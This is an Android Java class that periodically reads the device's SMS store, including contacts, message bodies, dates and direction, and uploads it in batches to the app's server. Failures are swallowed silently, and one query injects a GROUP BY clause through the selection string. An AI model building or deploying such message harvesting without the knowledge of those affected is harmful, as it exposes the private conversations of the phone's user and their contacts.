package com.qingyun.zhiyunelu.ds.sms;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Message;

import com.qingyun.zhiyunelu.ds.AppAssistant;
import com.qingyun.zhiyunelu.ds.Constants;
import com.qingyun.zhiyunelu.ds.data.SmsMsgInfo;
import com.qingyun.zhiyunelu.ds.net.ApiService;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import velites.android.utility.utils.HandlerUtil;
import velites.android.utility.utils.SystemUtil;
import velites.java.utility.generic.Action1;
import velites.java.utility.log.LogEntry;
import velites.java.utility.log.LogHub;
import velites.java.utility.misc.ExceptionUtil;
import velites.java.utility.misc.StringUtil;

/**
 * Created by luohongzhen on 22/02/2018.
 */

public class SmsManager {

    private final static String TAG = SmsManager.class.getSimpleName();

    private static HandlerUtil handlerUtil;
    private static final int MSG_TAG_UPLOAD_SMS = 3002;

    private static Uri uri = Uri.parse("content://sms/");
    private static String[] projection = new String[]{"_id", "thread_id", "address", "body", "date","type"};

    private static String myPhone;

    public static void initSms(){
        if(handlerUtil != null){
            handlerUtil.releaseData();
            handlerUtil = null;
        }
        handlerUtil = HandlerUtil.create(false, TAG, new Action1<Message>() {
            @Override
            public void a(Message arg1) {
                String token = AppAssistant.getPrefs().getStr(Constants.PrefsKey.AUTH_TOKEN_KEY);
                myPhone = AppAssistant.getPrefs().getStr(Constants.PrefsKey.MYSELF_PHONE_NUM);
                if(!StringUtil.isNullOrEmpty(token) && !StringUtil.isNullOrEmpty(myPhone)){
                    uploadSmsList();
                }else{
                    LogHub.log(new LogEntry(LogHub.LOG_LEVEL_WARNING, this, "don't upload sms info maybe auth token invalid or myself phone don't get -- token:%s my phone:%s",token, myPhone));
                }
                handlerUtil.removeMessages(MSG_TAG_UPLOAD_SMS);
                handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_SMS, Constants.UPLOAD_SMS_CYCLE);
            }
        });

        handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_SMS, Constants.UPLOAD_SMS_CYCLE);
//        handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_SMS, 5000);
        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, TAG, "init sms manager"));
    }

    public static boolean isGetMySelfPhoneNum(Context ctx){
        String curPhoneNum = AppAssistant.getPrefs().getStr(Constants.PrefsKey.MYSELF_PHONE_NUM);
        String myPhoneNum = SystemUtil.getMyselfPhone(ctx);
        if(!StringUtil.isNullOrEmpty(myPhoneNum)){
            if(StringUtil.isNullOrEmpty(curPhoneNum))
                AppAssistant.getPrefs().setStr(Constants.PrefsKey.MYSELF_PHONE_NUM, myPhoneNum);
            return true;
        }else{
            return !StringUtil.isNullOrEmpty(curPhoneNum);
        }
    }

    public static void uploadSmsList() {
        ContentResolver contentResolver = AppAssistant.getDefaultContext().getContentResolver();
        Cursor c = contentResolver.query(uri, projection,"0=0) GROUP BY (address",null,"date asc");
        if(c != null){
            SmsMsgInfo info = new SmsMsgInfo();
            final List<SmsMsgInfo> contacts = new ArrayList<>();
            info.setContacts(contacts);
            info.setPhoneFrom(myPhone);
            while (c.moveToNext()){
//                String _id = c.getString(c.getColumnIndex("_id"));
//                String thread_id = c.getString(c.getColumnIndex("thread_id"));
                String address = c.getString(c.getColumnIndex("address"));
//                String body = c.getString(c.getColumnIndex("body"));
                String date = c.getString(c.getColumnIndex("date"));
                SmsMsgInfo contact = new SmsMsgInfo();
                contact.setPhoneTo(address);
                contact.setLastChatTime(date);
                contacts.add(contact);
            }
            c.close();
            AppAssistant.getApi().uploadSmsContacts(info).subscribe(new ApiService.ApiObserver<SmsMsgInfo>() {
                @Override
                public void onSuccess(SmsMsgInfo smsMsgInfo) {
                    if(smsMsgInfo != null){
                        SmsMsgInfo data = smsMsgInfo.getData();
                        if(data != null){
                            List<SmsMsgInfo> listContact = data.getContacts();
                            int count = 0;
                            if(listContact != null && listContact.size() > 0){
                                SmsMsgInfo chatInfo = new SmsMsgInfo();
                                chatInfo.setPhoneFrom(myPhone);
                                List<SmsMsgInfo> smsChatList = new ArrayList<>();
                                chatInfo.setSmsChats(smsChatList);
                                for(int i = 0; i < listContact.size(); i++){
                                    SmsMsgInfo item = listContact.get(i);
                                    String address = item.getPhoneTo();
                                    String lastUpdateTime = item.getLastUpdateTime();
                                    SmsMsgInfo chats = new SmsMsgInfo();
                                    chats.setPhoneTo(address);
                                    List<SmsMsgInfo> chatsList = uploadSmsMsg(address, lastUpdateTime);
                                    chats.setChats(chatsList);
                                    smsChatList.add(chats);
                                    count += chatsList.size();
                                    if(count >= Constants.Logic.WECHAT_MSG_UPLOAD_ONCE_LIMIT){
                                        submitSmsMsg(chatInfo);
                                        smsChatList.clear();
                                        count = 0;
                                    }
                                }

                                if(count > 0){
                                    submitSmsMsg(chatInfo);
                                }
                            }
                        }
                    }
                }

                @Override
                public void onFail(Throwable e) {
                    ExceptionUtil.swallowThrowable(e);
                }
            });
        }
    }

    private static List<SmsMsgInfo> uploadSmsMsg(String addressTmp, String dateTmp){
        ContentResolver contentResolver = AppAssistant.getDefaultContext().getContentResolver();
        String[] selectionArgs = new String[]{addressTmp, StringUtil.isNullOrEmpty(dateTmp)?"0": dateTmp, String.valueOf(new Date().getTime() - Constants.UPLOAD_SMS_OFFSET)};
        Cursor c = contentResolver.query(uri, projection, "address=? AND date >=? AND date <= ?", selectionArgs, "date asc");
        List<SmsMsgInfo> chatsList = new ArrayList<>();
        if(c != null){
            while (c.moveToNext()){
                String _id = c.getString(c.getColumnIndex("_id"));
                String thread_id = c.getString(c.getColumnIndex("thread_id"));
                String phone = c.getString(c.getColumnIndex("address"));
                String body = c.getString(c.getColumnIndex("body"));
                String date = c.getString(c.getColumnIndex("date"));
                int type = c.getInt(c.getColumnIndex("type"));
                SmsMsgInfo chat = new SmsMsgInfo();
                chat.setMsgId(_id);
                if (type == 1) {
                    chat.setSend(false);
                } else if (type == 2) {
                    chat.setSend(true);
                } else {
                    continue;
                }
                chat.setCreateTime(date);
                chat.setContent(body);
                chatsList.add(chat);
            }
            c.close();
        }
        return chatsList;
    }

    private static void submitSmsMsg(SmsMsgInfo chats){
        AppAssistant.getApi().uploadSmsChat(chats).subscribe(new ApiService.ApiObserver<SmsMsgInfo>() {
            @Override
            public void onSuccess(SmsMsgInfo smsMsgInfo) {
                LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, this, "upload sms info:%s", smsMsgInfo != null?smsMsgInfo.toString():"null"));
            }

            @Override
            public void onFail(Throwable e) {
                ExceptionUtil.swallowThrowable(e);
            }
        });
    }

    public static void startUpload() {
        if (handlerUtil != null) {
            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, SmsManager.class, "start upload sms info"));
            handlerUtil.sendEmptyMessage(MSG_TAG_UPLOAD_SMS);
        }
    }
}
